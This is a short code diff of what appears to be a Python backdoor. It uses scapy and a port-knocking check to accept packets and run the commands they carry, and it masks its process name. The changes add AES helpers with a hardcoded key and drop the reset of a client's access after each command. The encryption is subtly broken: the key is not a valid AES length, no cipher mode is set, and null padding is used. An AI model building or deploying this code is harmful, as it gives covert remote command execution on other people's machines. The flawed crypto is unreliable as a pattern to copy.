@@ -1,9 +1,28 @@
 import time
 import setproctitle
 import logging
+import base64
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+from subprocess import *
+from Crypto.Cipher import AES
 CONN_IPS = {}
+MASTER_KEY = "CorrectHorseBatteryStaple"
+
+
+def encrypt_val(text):
+    secret = AES.new(MASTER_KEY[:32])
+    tag_string = (str(text) + (AES.block_size - len(str(text)) % AES.block_size) * "\0")
+    cipher_text = base64.b64encode(secret.encrypt(tag_string))
+
+    return cipher_text
+
+
+def decrypt_val(cipher):
+    secret = AES.new(MASTER_KEY[:32])
+    decrypted = secret.decrypt(base64.b64decode(cipher))
+    result = decrypted.rstrip("\0")
+    return result
 
 
 def verify_root():
@@ -57,7 +76,6 @@ def port_knock_auth(packet):
                 return
             # Else just decode the packet
             run_cmd(packet)
-            del CONN_IPS[ip]
         # If port is irrelevant
         elif(dport not in access):
             del CONN_IPS[ip]
